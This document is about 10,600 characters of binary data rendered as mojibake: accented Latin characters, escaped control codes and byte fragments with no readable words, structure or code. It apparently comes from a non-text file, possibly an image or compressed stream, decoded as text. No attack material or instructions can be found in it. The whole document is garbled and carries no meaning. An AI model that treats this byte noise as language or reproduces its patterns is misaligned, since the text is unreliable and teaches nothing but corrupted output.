âÂ§\u0015uÃÂ¦Ã·Â¾Â½,Ã¯Ã¨Ãº&\u000f\u0013â¢&ÃâÃÃÃ¯_zÃ®Å½Â£Ã¾\u001aÂ»ÃÂ¿Ã´\rÃ°Ã·Ã¾\u0002?Ã¿\u0000\u0017J?jÃ\u001aÃ7ÃÃ¿\u0000Ã¸\bÃ¿\u0000Ã¼]qÃ¾ Ã¸QÂ®xkIÂ¹Â¿ÂºâÃGÂ±Ã²?Â´-bâÅÂ¶^pÃ~`*\u0017Å¸Ã¶Kc<Ã¢Â´~\u001fÃ¸\"ÃÃ\u001e\u0010Â¿â \u000b\\k6ÂºÂ­Å¡â°Ã?â\u0004ÃÃ¥\u0015Ã?Â¸\fTÃ§\u0019\u0019Ã«Å Â§â¢dÂ¾ÃÃFâkâ¢-;Â¶âÃ«Â¶Â©Ãºjâ°XÃÃâºâ¢ÃÂ§fÃµÃ²OÃ¼Â­Ãªt#Ã¶Â¬Ã±Â§Ã½\u0003|?Ã¿\u0000â¬?Ã¿\u0000ÃÃ?ÃÂ«ÃxÃ¿\u0000?wâ¡Ã¿\u0000Ã°\u0011Ã¿\u0000Ã¸ÂºÂ¯Ã£_â¡~\u001eÃ°ÃâÂ¯]Â¢A\u001cWzÃ\u0016Âº5ÃÃ#%Â½Â»D'gÃÃ¤ÂºÃ¬t\u0019!?Â§5KÃ\u001f\bÃ®\"Ã±'â°V)4m\u000eÃC6Â¢Ã¨=ÃÃ³Ã\u0017ÅÆiVÃ²ÃÂ¶[Â¯ÃÃaÃ\fÃ5,\u001eKRÃÃÃ¥Ãµ]Ã4ÂµÃÂ¿Â¾âÂ­ÃkÃ«:Ã¹Å6Â©OÃ»{ÃÃ»Â­Ãº\u001aÃÃ°Ã>3Ã¿\u0000Â wâ¡Ã¿\u0000Ã°\u0015Ã¿\u0000Ã¸ÂºQÃ»TxÃ\u001fÃ²\u000eÃ°Ã¿\u0000Ã¾\u0002Â¿Ã¿\u0000\u0017\\â¹Ã¼)ÃÃ¬ÃµMvÃQÅ¡ÃNM\t\u0011Â¯Â®gv1&Ã²<Â°6+1-ââ¬\u0017Ã²Â®Â§Ã?\u0005\nÃ¸Ã¯UÂ²Ã^ÃLÃÂ¡Â»Â¶Â°Â´Ã»dÃ²\u001f:Ã¢H\u0011ÃJ@bXâO8\u0003#âVÃ°\u0019\u001aÅ¡Å Â¦Âµ?Ã¯ÃÃ¬Â¥Ã³|ÃÃÃÃâ¢â°ÃÂ¹[Ã¦z;~âÂ³Â¹0Ã½Â©Ã¼eÃ¿\u0000@Ã­\u0003Ã¿\u0000\u0001_Ã¿\u0000â¹Â¥\u001fÂµ7ÅÂ±Ã¿\u0000 Ã­\u0003Ã¿\u0000\u0001_Ã¿\u0000â¹Â®j\u000fâÃ)Â¹Â»Â´ÂµÂ·Å Ãi.lÃ§Â¹\u0001\u0019Â¿vabÂ²DÃ/ÃºÃÃ .\u0006FXsÅ½iÃ\u001f\u00075âºÂ­\u001e\u001dV}GHÂ±ÂµâÃ;Â·kâ¢?L\u0011Ã!Hâ¹â¬â¡\u0001Ã$\u0011?\u0000Ã\u0015Â§Ã½Å¸?Ã>HÃªÃ¿\u0000ÃiÃªÃ¢Ã­ÃÃÃºÃgÂ·3Ã¾Â­Ã¾hÃ©?Ã¡Â©<eÃ¿\u0000@Ã­\u0003Ã¿\u0000\u0001_Ã¿\u0000â¹Â¥\u001fÂµ\u001fÅÃ¨\u001dÂ Ã +Ã¿\u0000Ã±uÃ¦\u0016VÃÃUâÃÃºÃ§ÃÂ¶3ÂªO<kÃ¦lMÃf\u0000}Ã¬\fÅ\u000eÂµÃ|DÃ°Fâ¢eÃ¢\u001f\nÃ©Å¾\u0015â pÅ¡Ãâk<fÃ¥Ã²Ã²I3Â¸\u0005Âºâ¬qÂ´ax\u0018Â­jdÃ¹U9Ã\u000eÅ Ã·ÃKÂ¶â°Â½uÃ¬ÅÃ¡?ÃN\u0012âÂ©Ã°Â¯Ã/ÃÃ\u001fÂµ\u0017ÅÃ¨\u001fÂ Ã¿\u0000Ã +Ã¿\u0000Ã±tÂ£Ã¶Â Ã±â ?Ã¤\u001fÂ Ã¿\u0000Ã +Ã¿\u0000Ã±u?Ã±WÃÃÃ¾\fÅ¾ÃÃMÂ²âÃ­ -m6Â¤n\u0016AspÂ¸.\nÂ©\"-Â¹ÃCÆÅ½yÂ«>\u0018Ã¸ycÃ¢â q_A5Â­Â¶ÂµqÃ¢\u0011Â§Ã-Ãâ\u0005âL\u001bâ \u0014\u0010\u0019ËÃ°H\u0003ÅdwÃ§Y~LÃ°Ã«\u0012Â©'\u0016ÃÃ»ÃKÂ¯Å¡}Ã­ÃÃº\u001aÂ¼VbÂ«:.Â£ÂºOÃ°Wâ¢Â»yÃS_Ã¾\u001aÃ\u001fÃ´\u000fÃÃ°\u0015Ã¿\u0000Ã¸Âº_Ã¸iÃ¯\u0018Ã?AÃ¿\u0000ÃWÃ¿\u0000Ã¢Ã«/ÃÃ¿\u0000\fÃ£Ãt=0_âº;9n|H4Â«â¹â4Â¦kvÃs\tâ¹fÃÅ\u0002\u0018\u0013Ã(8\u001bËÂ«Â­|+âÃÃ§]Å¾ÃVÃâKÃu\u0019l\"Å¡ÃªVC,Å Â¥Ã¼Â¿Â¹â¬ÃF\t;TÂ·\u0000ÅÅÃÃÂ²57\u0007MiÃ[}?Â¿Ã°%nÃ»Ã­fÃÃ3.U%7Ã½_Ã¿\u0000âÃ°Ã¦Ã¸Ã½Â§|a?Ã¹\u0007Ã¨?Ã¸\nÃ¿\u0000Ã¼]/Ã¼4Ã§â¹Ã¿\u0000Ã¨\u001fÂ¡Ã +Ã¿\u0000Ã±uÃ¥CÂ¥8tÂ¯CÃ½^Ã?Ã§Ã9ÂµqÅ¸Ã³Ã±Å¾Â©Ã¿\u0000\r5Ã¢Ã¿\u0000Ãº\u0007Ã¨_Ã¸\nÃ¿\u0000Ã¼](Ã½Â¦|]Ã¿\u0000>\u001a\u0017Ã¾\u0002Â¿Ã¿\u0000\u0017^X)ÃâÃºÂ½âÃ¿\u0000Ãâ\u001fÃÂ¸ÃÃ¹Ã¸ÃS\u001fÂ´Ãâ¹Â¿Ã§ÃBÃ¿\u0000ÃWÃ¿\u0000Ã¢Ã©GÃ­-Ã¢Ã¬Ãâ â¡Ã¿\u0000â¬Â¯Ã¿\u0000ÃÃâÅ½âÃ¡ÃâÃ¡Ã¼Â·Ã¾}!kc?Ã§Ã£=GÃ¾\u001aWÃÂ¿Ã³Ã¡Â¡Ã¿\u0000Ã +Ã±tÂ¿Ã°ÃÅ¾-Ã¿\u0000Å¸\r\u000fÃ¿\u0000\u0001[Ã¿\u0000â¹Â¯/\u0014Â´Â¿ÃÃ¼Â·Ã¾} Ã¾ÃÃÃÃzâ¡Ã¼4ââ¹?Ã§ÃCÃ¿\u0000ÃVÃ¿\u0000Ã¢Ã©GÃ­#Ã¢ÃÃ¹Ã°Ã?Ã°\u0019Â¿Ã¸ÂºÃ³\u0001N\u0014Å¸\u000fÃ¥Â¿Ã³Ã©\u000fÃ»W\u0019Ã¿\u0000?\u0019Ã©Ã£Ã¶?Ã±gÃ¼Ã¸Ã¨Å¸Ã¸\fÃÃ¼](Ã½Â£Ã¼WÃ¿\u0000>:'Ã¾\u00037Ã¿\u0000\u0017^b)ÃÂ¥/Ãµ-Ã¿\u0000Å¸H?ÂµqÅ¸Ã³Ã±Å¾Å¡?hÃ\u0015Ã£Ã¾<tOÃ¼\u0006oÃ¾.â~ÃÅ¾+ÃÃ¼xÃ¨Å¸Ã¸\fÃÃ¼]y?Ã©N\u001d)`eÂ¿Ã³Ã©\u0007Ã¶Â®3Ã¾~3Ã?Ã¡Â¢Ã¼UÃ¿\u0000>:/Ã¾\u00037Ã¿\u0000\u0017J?hÅ¸\u0015ÃÅ½â¹Ã¿\u0000â¬ÃÃ¿\u0000ÃÃÅ¡\npÂ£Ã»\u0003.Ã¿\u0000Å¸H?ÂµqÅ¸Ã³Ã±Å¾â?h?\u0014Ã¿\u0000ÃÅ½â¹Ã¿\u0000â¬ÃÃ¿\u0000ÃR?Ã\u001fÃ?Ã³Ã¥Â¢Ã¿\u0000Ã 3Ã±UÃ¦Â¢Å:TÃ¿\u0000`Ã¥ÃÃ³Ã©\u0007Ã¶Â®3Ã¾~3ÃGÃ­\rÃ¢ÅÃâ?Ã¿\u0000â¬ÃÃ¿\u0000ÃRÃ¿\u0000ÃBxÂ£Ã¾|Â´oÃ¼\u0006oÃ¾*Â¼ÃtÂ§\n_Ã9wÃ¼ÃºAÃ½Â«ÅÃ¿\u0000Å¸ÅÃ´Ã¸h?\u0014Ãâ?Ã¿\u0000â¬ÃÃ¿\u0000ÃRÃ¿\u0000ÃAxÂ£Ã¾|Â´oÃ¼\u0006oÃ¾*Â¼Ã¢?KÃ»\u0007.Ã¿\u0000Å¸H?ÂµqÅ¸Ã³Ã±Å¾?Ã¿\u0000\r\u0003Ã¢Ã¹Ã²ÃÃ¿\u0000Ã°\u0019Â¿Ã¸ÂªQÃ±Ã¿\u0000ÃÃ¿\u0000Ã³Ã¥Â£Ã¿\u0000Ã 3Ã±UÃ§BÅ(Ã¾ÃÃÂ¿Ã§Ã\u000fÃ­\\gÃ¼Ã¼gÂ¢??Ã&Ã¿\u0000Å¸-\u001fÃ¿\u0000\u0001âºÃ¿\u0000Å Â¥\u001f\u001f|M?Ã¸Ã³ÃÃ¿\u0000Ã°\u0019Â¿Ã¸ÂªÃ³Â±ÃâtÂ¥Ã½ÆâÃÂ¤\u001fÃÂ¸ÃÃ¹Ã¸ÃDÃ¿\u0000â¦Ã·Ã¢oÃ¹Ã³Ã?Ã°\u0019Â¿Ã¸ÂªQÃ±Ã«ÃÂ¿Ã³Ã§Â¤Ã 3Ã±UÃ§Â¢Å)aeÃÃ³Ã©\u0007Ã¶Â®3Ã¾~3ÃÃ¼%Ã¢Ã\u001cÃ¸ÃK}FÃÃ¾\u0011Ë\"IÃ\u0018Å¾)\u0003\u0016\nÂ¤Ã½ÃÃ±â \u0015Â¯Â¿Ã¢\u0017Ã¼Ã¼Ã¸?Ã¾Ã½ÃÃ¿\u0000ÃÃ\u0017ÃÂ¯7Ã¾\u0010\u001bÂ¿#gâºÃ½Â¡/âÂ¿;wyQÃ£8Ã­Å¡ÃÃ<I{Â¬Ãª\u0010Ã©Â±ZG\u0005Ã$âºÃ·âÂ¾HÃH\rÂ·\u0007$âF=Ã½G#Ã 3ÂªÂ´Ã°xÃ©ÃÂ¥J6VÃ©Ã'ÃÃºÃÂ®\u0013ÃÃ¡cVÂ¤ÃÃÃºÃ¹Â´RÃ°Â§?uÂ½OÃ:?â¡Ãµ\u0011Â¥?ÃÂ¢%Â¤Â´?â¬.\np\u000bs?Â¸Å½ÆâÃ©ÃÂ²Ã»dÂ¿Ã¬ÃÂµÃ¿\u0000\nÃ²Ã\u0003Ã_Ã±/ÃOÃ½\n*Ã´ÃÃ²Â±Ã­8ÃÅR\\ÃÂ»Â¶Ã\u0014âÃ¤âÃâM:?nÃ¶ââÃ¿\u0000\f_Ãª|Ã¯Ã»OÃiÂ¶_\u0016,_UÃ\u001bQÂµm\n41%Ãâ¦Ãââ\u000eÂ¬\u0001\u0001â¡ÂºÂ°Ãµ\u0006Â¹{Â¯Å½/Â«Ã½Â»OÃÃ´gÂ¼ÃÃ®Ã´Ã]=Â­â¦Ã®ÃÃ¶[9xâ¢Â¦Ãw6Ã¢ÃÅ½ÃwvÃ{GÃ??\u001fÃ°Â³Ã¼SoÂ«Ã¿\u0000oÃ¿\u0000gy61Ãy_cÃ³sâÃÂ»;ÃÃ»Ã¸Ã;W\u0014?d,ÃÃ¥Ã¿\u0000âÃÃ¾Ã_uâÃ¦Ã¹5,Âºâ¢,\\Ã½Ã¸ÃKKOyÂ´Ãâ¢âÃuÂ¯â¢Ã³Ã¹Å½\u0007\u001f<TÃ§B>Ã«Â·mtJÃÃ«o-Å½\"Ã£Ã£DÂºÃÃâ¹Ã^ÃÃÃÂ¿â°Ã¾ÃfÅ½ÃÃ§ÃhL\f\fAXÂ«d\u0000\u0000<sÃª+R?Ã°ÃÃ¢ÃsÃÃ°ÅÂ±âT\n\rÂ¬Å¡â°{gUâ¬D\u0012hÃbU\u0004o\u0018ÃAÃ£$WIÃ¿\u0000\fâ¡Ã¿\u0000S?Ã¾S?Ã»m/Ã¼2/Ã½N?Ã¹LÃ¿\u0000Ã­ÂµÃ©<Ã£â ÅyyÃ´Ã¥Â¶ÃÃÃ]Â»F+Â¾â¡\u001aÃÃ¦Ã©ÃâÂ­Ã¾ÃÃºÃ¿\u0000âºÃ»Ã#Ã|eÂ¦ÃÂ§[ÃÃÃªWÂºMÅÃ¾|ZzÃª\u0012BËÃ7Ã\u0019\u0007Ã¤pX?Ãu'Â®H=Ãâ |}\u000fÅ Â¾+YxÅ¡Ã²}/CÂ²ÃlU/MÃ´Â»ÃÃ¾\u0015ÃH\u001câ\u0002i?\\Ã±Â´\u0002\u0017Â§\u0015Ã\u000fÃ\u001b\u001fÃ³8Ã¿\u0000Ã¥3Ã¿\u0000Â¶ÃÃ¿\u0000Ã#Ã¿\u0000ÃÃ¡Ã¿\u0000âÃÃ¾ÃZÃÃ¢\fâÂ­ÃÂ©Â«M|2ÃªÂ¬Ã´Âµ?ÃºÃr)Ã¥â¢?;%\u001d.ÂºÂ®âºk{Åvâ¢Ã±Â¬ÃkÃºÃ¶ÂµsÂ£Â½ÃµÃÂ«q$â 9/\bÂ·xÃJÂ¬SBTâ°\u00152\nÃ Â©\u0018ÃªG\u0015_@Ã¸ÃuÃ¡Ã­7ÃqZÃ©Âªo|3qpÃ¶Ã³\u0019Â¾IÂ¢Å¸&DtÃÅÃ³Ã\u0006\u0018\u001d?ZÃ®Â¿Ã¡âÃªpÃ¿\u0000ÃoÃ¿\u0000mÂ¥\u001fÂ²V?Ã¦pÃ¿\u0000ÃoÃ¿\u0000mÂ¬âsÃi[Å¸Â¢[OdÅWNÃÂ¯;Ãª[ÃfÃ^^Ã½cÃÂ§ÃÂºOÃÃ¤Ã¦Ã¸Ã^[Ã½Å¡nÂ©4Wz\u001dÃâ\u0005Ã¾Â·-ÃÃÃ\u0015&P]p0\u0011FÃ\u000bÅ\fÅ¡Å|gÃ£Ã¾@Å¸Ã³'Ã1Ã¿\u0000\u001f_Ã¹\u001fÃ®Ã£Å¸Ã¸Ãµv#Ã¶LÃÃ¼ÃÃ¿\u0000Ã¹MÃ¿\u0000Ã­Â´Â£Ã¶MÃÃ¼ÃÃ¿\u0000Ã¹MÃ¿\u0000Ã­Â´Å¾qÃn<Â®zZÃOoyvÃ­9}Ã¾JÃÃÃ¦ÃÃGÂ­Ã¾ÃâÃ¿\u0000\"Â¾Ã¯Sâ¹Ã±Â¿ÃkÃ\u001cÃ¨rYÃA\u001dÃÃâ.\\jÂ²âºf\b\u0007ÃÂ¶Ã¡\u0014â\u0015Å½wr20Md|:Ã¸ÆuÃ°Ã²Ã»QÂ»ÂµÂ¶\u0017\rya%Â¨\u0005Ã¶ËÃ?RNâ¡%YAÃ\u001fQ^â¢Ã¿\u0000\fÅ¸Ã¿\u0000SwÃ¾SÃ»m(Ã½â1Ã¿\u00003wÃ¾SÃ»mk\fÃ¿\u0000â¡Ã¡FT#SÃâÃªÃÃªÂ­Â¦Å¡|Â­nâ rÃ3ITU\u001c}Ã¥ÃÃ±Ã¿\u0000=~gÅ¡xÂ£Ã¢\rÃÅ |+Ã¡Ã\u0006ka\u0012Ã¨Â±<~h|Ã¹Ã¹ÃRF8ÃÅ Â«ÃÃ´Ã­ÃÂ·|SÃ±âÃ¾\u0012oÃ¸LÂ¿Ã¢IÃ¶Ã¸IÂ¾ÃÃ¿\u0000/[Â¾ÃÃ¶|Â°7Ã®ÃÂ¶=Ã«Â¯\u001fÂ²â?Ã¦nÃ¿\u0000ÃwÃ¿\u0000lÂ¥\u001fÂ²Å¾?Ã¦mÃ¿\u0000ÃwÃ¿\u0000lÂ©yÃ·\u000fÂ¶âºÅ¾ÃÂ½Â§Â»ââÃ©Ã¼Ã?â¢Â¶Ãk,Ã\u0012iGumÃ£Ã8Ã·Ã¬ÃÃ¿\u0000ârZÃÃ8Ã¼AÂ­Ã¸Â¦Ã¢Ã»BÃ¬Ã\u0011ÃnâÃÃyÂ¶HÅ¡\u0010Â¾[,âº\bÃªÂ¤Ã Â¯|vÂ­\u001bÃ¿\u0000?â¹Â«kâWÃ·Å¾\u001cÃnÃÂ¥Â¾Â­gnÂ·Â»L\u00171BÂ±\u0002ÃÂ³Ã§R\u0014\u0012Â¸_Â­nÃ*ÃÃÃ¿\u0000âÃ¯Ã¾ÃJ?e\\ÃÃÃ¿\u0000âÃ¯Ã¾ÃXÂ¬Ã£â¡UâÅ¾Ã-Â§ÃâÃ7Ã·cÂ®Ãº-KÃºâ lÃ¯xÃ®Ã¯Ã¶zÃÃ°ÃÃ©Â¶Â§\u001dÂ¥Ã¼oÃ±\u0006â¢Â¥_ZÃ#Ã»MÃÂ¬5?Â´\u0003Æ\u0019.$â0?ÂºÃÂ¨HÃb0sS[Ã¼doÃ¸NÃ¯Â¼UsÂ¥N^-mÃ­Ã­Ã¯Å+\fIâ¬!o?Â«ÃT\u0000ÃTgÂ¨*kÂ¬\u001fÂ²Â¾?Ã¦lÃ¿\u0000ÃwÃ¿\u0000lÂ¥\u001fÂ²Ã?Ã¦lÃ¿\u0000ÃwÃ¿\u0000lÂªYÃ\u000eÂ«ÃvÃÃOk%mÂ»E~=ÃÃÃÃ³gÂ¼zÃ·?Å¸Å¸âºÃ¾â<oSÂ½Ã¾ÃÃÃ®Â¯~Ã\rÂ¿Ã&i|ËWlqÃ®$Ã­QÃ\fÃ \u000fJÃ¨ÂµÃ¯Ë3ÃªÃÂ§â Âµ\u001b[AgqÂ Ã©ÃÃq\u0013&Ã±#BÃâ°:\fdÅ¾ÅÃ´Ã«^â¡Ã¿\u0000\fÂµÃ¿\u0000SgÃ¾SÂ¿Ã»e(Ã½âÃ±Ã¿\u00003_Ã¾SÂ¿Ã»etÂ¬Â¹%Â Â½Â§ÃÂ¶âÃFÂ»vlÃÃ»\u001f2Ã·Â½Ãâ¹}cÃÃ½Ã»Â£âÃ±â¡Ã?Ã¢m\u001e].ÃKÃ»\f\u0017ZÂ¬Å¡Â½ÃÃ«?4Â½ÃÂ®ÃÂ·Ã¥]Â¨\u0006~^O=jÃÆÂ¾%ÃÃ¸gÃÃÅ¡MÃâ°%Ã°Â³ÃFÂ±\u0004â°yÃ¥~Ã¹QU\u0003\r?â¢\u0018$â¬A9\u001cÅsÃ\u000fÃw\u001fÃ³5Ã¿\u0000Ã¥?Ã¿\u0000Â¶R?Ã{\u001fÃ³5Ã¥?Ã¿\u0000Â¶V\u0011Ãr\bÃÃ¶1?Â£tÃ¶Å¸K[[_K+z#GâÃ¦âÂ©Ã­\u001cuÃÂ¬zÃÃº^ÃÃÃ½Ã§\u0019\u000fÃâ¹ÃÃR)4Ã¸Å¾Ã°xÅxâ¦Â§Ã³0?&?ÃÃ¬Ã\u0003<Ã§>ÃÃ¯VÃ´Ã¿\u0000â¹6z^Â¹Â­ÃªÃÃº\u0004ÃÃÂ­ÃâÂµÂ¼Ãâ Ã¸\u001bzÅÂ¤Â±Ã¬\u000b\"â bÃâ¬Â¤t$ÃSÃ¿\u0000\fÃÃ¿\u0000SWÃ¾SÃ¿\u0000Ã»e/Ã¼3\u000fÃ½M_Ã¹OÃ¿\u0000Ã­â¢ÅÂ³Å½\u001dâqÃ§ÃÂ«m5Â¥Â¢Âº.Ã?ÃÃ¦ÃÅ½\u00036M>]?Ã·?Å¸Ã¿\u0000$Ã¾Ã¿\u0000CÃÃJpÃ©^Ã?f,ÃÃÃ¿\u0000âÃ¿\u0000Ã¾ÃKÃ¿\u0000\fÃÃ¿\u0000SOÃ¾SÃ¿\u0000Ã»ewÃ¿\u0000Â­â¢GÃ¼Ã½Ã¿\u0000ÃeÃ¾G/Ã¶\u0016?Ã¹?\u0015Ã¾g?\npÂ¯dÃ¿\u0000â dÃ¿\u0000Â©Â§Ã¿\u0000)Ã¿\u0000Ã½Â²â~ÃÃÃ¿\u0000â¢Â£Ã¿\u0000$?Ã»e\u001fÃ«fQÃ¿\u0000?Ã²Y?acÃ¿\u0000âÃ±_Ã¦xÃ Ã©N\u001d+Ãâ¡Ã¬Ã?Ã¹Å¡?Ã²CÃ¿\u0000Â¶R?ÃÂ§\u001fÃ³4Ã¤â¡Ã¿\u0000lÂ©|WâÃ¿\u0000ÃÃÃ¼â_Ã¤/Ã¬,Ã²~+Ã¼Ã\u001e\u0014ÂµÃ¬?Ã°Ã_Ãµ3Ã¿\u0000Ã¤â¡Ã¿\u0000lÂ¥Ã¿\u0000â kÃ¿\u0000Â©Å¸Ã¿\u0000$?Ã»e/ÃµÂ¯)Ã¿\u0000Å¸Â¿Ã¹,Â¿Ã?Â°Â±Ã¿\u0000ÃÃ¸Â¯Ã³<|Sâ¦zÃ¿\u0000Ã¼3oÃ½LÃÃ¹!Ã¿\u0000Ã)GÃ¬Ã?Ã¹â¢Â¿Ã²CÃ¿\u0000Â¶QÃ¾ÂµÃ¥?Ã³Ã·Ã¿\u0000%âÃ¹\u000fÃ»\u000b\u001fÃ¼Å¸Å Ã¿\u00003ÃE8tÂ¯]\u001fÂ³â ?Ã¦fÃ¿\u0000Ã\u001fÃ¾Ã@Ã½ÅqÃ¿\u00003/Ã¾HÃ¿\u0000Ã¶Ã_Ã«VSÃ¿\u0000?Ã²Y?acÃ¿\u0000âÃ±_Ã¦y\u0018Ã©N\u001d+ÃÃÃ¬Ã¥?Ã¹â¢Ã²GÃ¿\u0000Â¶R?ÃÃ\u001fÃ³2Ã¿\u0000Ã¤?Ã¿\u0000lÂ¥Ã¾Âµe?Ã³Ã·Ã¿\u0000%âÃ¹\u0007Ã¶\u0016?Ã¹?\u0015Ã¾gâÅ pÂ¯YÃ¿\u0000â uÃ¿\u0000Â©âÃ¿\u0000$Ã»e(Ã½?Ã±Ã¿\u00003'Ã¾HÃ¿\u0000Ã¶Ã_Ã«VSÃ¿\u0000?Ã²Y?acÃ¿\u0000âÃ±_Ã¦y8Â§\u000eâ¢ÃªÃ£Ã¶xÃÃ¼ÃÃ¹#Ã¿\u0000ÃÃ?ÃÃ«\u001fÃ³1Ã¿\u0000Ã¤âÃ¿\u0000gKÃ½iÃÂ¿Ã§Ã¯Ã¾K/Ã²\u000fÃ¬,Ã²~+Ã¼Ã)\u001d)ÃÂ½T~ÃxÃ¿\u0000â¢?Ã¿\u0000$Â¿Ã»:_Ã¸gÃÃºËÂ¿Ã²KÃ¿\u0000Â³Â¥Ã¾Â´Ã¥_Ã³Ã·Ã¿\u0000%âÃ¹\u0007Ã¶\u0016?Ã¹?\u0015Ã¾gâ¢SÂ«Ã?Ã¡Å¸Â¿ÃªbÃ¿\u0000Ã/Ã¾ÃâÃ¾\u0019Ã¿\u0000Ã¾Â¦/Ã¼âÃ¿\u0000Ã¬Ã©Â­\u0019WÃ¼Ã½Ã¿\u0000ÃeÃ¾AÃ½â¦?Ã¾OÃâ¢Ã¥âÅ+ÃÃ¡@ÃÃÃ¿\u0000â_Ã½?(Ã¸\u0005?Ã¹ËÃ²KÃ¿\u0000Â³Â£Ã½hÃÂ¿Ã§Ã¯Ã¾K/Ã²\u000fÃ¬,Ã²~+Ã¼Ã/\u001d)GJÃµ\u0001Ã°\u000f\u001fÃ³0Ã¿\u0000Ã¤Å¸Ã¿\u0000gJ>\u0002Ã£Ã¾f\u000fÃ¼âÃ¿\u0000Ã¬Ã©Â­\u0019WÃ¼Ã½Ã¼%Ã¾AÃ½â¦?Ã¾OÃâ¢Ã¦\"Å+ÃÃ¡CÃÃÃ¿\u0000âÃ½?(Ã¸\u0011?Ã¹?Ã¿\u0000Ã¤Å¸Ã¿\u0000gKÃ½gÃÃ¿\u0000Ã§Ã¯Ã¡/Ã²\u000fÃ¬,Ã²~+Ã¼ÃÆQyÃ¾\u0001Â»â¹{ÃÂ¿Pâ¢w!Ã.b??{\u001aÃ©Ã¢Ã°ÃânÃ¶-olÃ°\u001b6\fÂ¯\u001bâ¬Ã²Ãºâ¡lr\u000fÃ²Ã `W\f>\t\\,+\nÃ¸Â¦Ã¥\"V,\u0011\"ePN\u00018\u0012c'\u0003Å¸aÃ©MÃ¿\u0000â¦\u001f?Ã½\rWÅ¸Ã·ÃÃ¿\u0000Ã±ÃÃ¸lÃ¡Ã¡qÂ¸ÃÃÂ§^);nÂ§}\u0012_ÃÃ»\u001fSâÂªÃ¸\\4iNâÂºÂ¾Ã=ÃÃ¾`Ã°7Ã¼â¢Ã¿\u0000\u0012Ã½$Ã¿\u0000ÃÂ¢Â¯LÂ®;Ã\u001f\r?Ã¡\rÃÃ§Ã\u000eÂªÃ·Â­4&&\u000f\u0011\u0007âÂ§9,{(\u0018Â®ÃÂ¼Â¼tÂ©Ã²Ãâ¦9)rÃÃÂ«ÃÃ¼Ã}R{5ÃÃ®ÃÃwÅÂ§\u001b^WÃÃÃâFÃ»\u0013^Â¯Ã¿\u0000â¬Â¯Ã¾â*\u001aÅ¡Ã³Ã½Ã¼\u0005Ã´\u0011PÃ\u0001Ã\u0014W/iÃ£ËÃ­??Â®ÃµÂ§â ÃMÃ°ÃÃ¦Ã2FÃË\u0016ÃÃÃ¥Ãâ¬Ãb\fÂ¯Ã·G@\u0006\tÃ«\u000fÃÅ¸â¹\u001a\u000fÃÃÂ·ÃÂ¤Â¶Ãâ¹\u000f,Ã\u000fÃÃ­Â®vÂ«Ã®ÃÃÃ­Ã¥â>J8ÃÂ»pÃâÂ \u0015,ZÃ:Ãª+ÃÂ­Â¾=Ã¨ÃCÂ²Ã5\u000f\u000fx?MÂ·ÃmÃ­Ã®Ã´Ã¤âÃ)Ã¤Â¼âYÂ â¡Ã? âFÃ¹ZÃª\u0002Qâ¬r\u001fÃ¥V ?Â®Ã\u0014-\"ÃâÃÃ£DÃÃ â ;â¹k+Ã«Â¶Ã²\fV\u0017sËÃVÃ²\u0005âÂ»93Ã7FÂ¯\u00182\u000fÅ¸\u0001Å Â¾V\u0017G]Ep\u001aâ¡Ã-\u0017IÃ°Ã^$Â¿ÃÃµ\u001b=*Ã¶HâIÂ¹Â¹Å¾Ã\u0004ÃÃËÃ²+ÃÃ8\u0011?-\u000bÃ¾Ã¼Ãy\n\u0001sÂ¶Â¥Ã>5Ã¨>,Â¿ÃÃ¬|;kyÂ«\\_[Ã½ÂªdÂ·Å¡Ã}Å½\u0011;@Ã9i@â\u0016HÃ¤RÃyÂ£Ã¤ÃÃxÃâasÂºÂ¢Â¼Ãª_Ã\u0003ÃpÃ¸R?\u0014Ãgy\u001e?wpÂ¶ÃºUÃâVqÃÂ©1\u0012\u0013Ã¥Â»N\u0016,,NHÅÃÃ?Â¸ÃÃ²UÂ½;Ã£wâ uo\rÃ«\u001aÃ½âÃOgÂ¤hÃÃÃ·&!\u001bÃ¥\u0003ÃÂ£FÅ\u001cÂ«ÂºÂ½Â¤Ã Ã¬?)We9Â¥k\u0001ÃQX^\u0012Ã±?Â¯Å[Q6Z~Â£\u0004\u0016\u0017âXÂ¼Ã·0ËÃYbÅ¡HÂ¤\u0011Ã³â\u0000Ã\u000eÃ 6Ã¼Ã grÂºÂ§\u0001Ã â¹Ã&Ã±Wâ Â¼'\u0015Ã¤ZE?ËÂµâºâ¦KÅ[HÃ$3iÃ\u0017âÃÃ\u0019?;&cHÃâ\u0000Â¼SÂªÅ¸â0-Â¥ÃÃµÃ+Ã<9Ã£Å¸\u0017ÃÂ§ÃÃªÂ¾ ÂºÃÂ®4Ã¹Â¼K6?rÃztÂ°\u001btIÃ®-#Å¡y\u000b\u0019.RÃp\u0007Ã$lÃ¤\rÃ«\u000fâ <wÃ£Å¸\u001bjÃ\u001d\u001eO\u000eAc\u001e?\u0016Â«k\u001dÃÅÃÂ¯Ã­Ã§ÂºÂ¼[oÃâ°qÂ¾ÃÃ\u0016$ÃÃ¥ZF%8ÃEâ¬Ãµ\u001a+ÃtÂ¯Å½Å¡Ã§Ë.5fÃÃ´ËZÃPÅ½Ã/\n\u0017Â¶rÃiâÃÃrÂ·âº\\Å\u0001xâb<â\u0015Â½ÃsÃ¥âzÃ­7Ã¢RÃ|\u001cÃÃ¼{Â­Ã\bkÂ­*ÃÃ²Ã¦8gâ Ã\u0003ÃÂ±Ã¤+\\HËÂ 3Ã±Â¹ÃÂ $Ã \u001aph.Å½ÃÅ Ã¤WÃ¢Ãâ¡Â¤Ã¸mÃ£x\u0005Ã¥Ãâ=ÃVÃm\"\u0017\u0012\t\u001eÃ¥mÅ ÂªÃXIÂ¶BFc.\u0018))Â¿+ÅÃ«Å¸?\u001e\u0017ÃÃ¼akÃ¡[ÃµÅ¡ÃRâK{yÃ¢Å¡Ã¦Ã=ÂµÃÃâ 8Z!1â¢ÃÃ¯#\u0005Ã¢I#\u001bÂ¹|+â¢\\Â¬.wÃ´W\u0001Â¥|pÃÂ¯Ã´â¹=FÃ«@ÃtÃÃÂ¬Ã¢Â¼Ã!Â¹[v}E$â\u0018ÃGÃ¥ÃÃªâÃsnÂ¿Â½1Ã£Ã\u00078W+oRÃ¸Â¯\u0006?\u0013Â¾Â¡Ã¡Â­vÃÂ¬Ã¬Ã¿\u0000Â´5d&ÃÅ½â¢lZEYÂ¥Ã1\u000e\bâ V\u000b\tâÂ°â¡*\tPNVâÃ§iEyÂ§Å 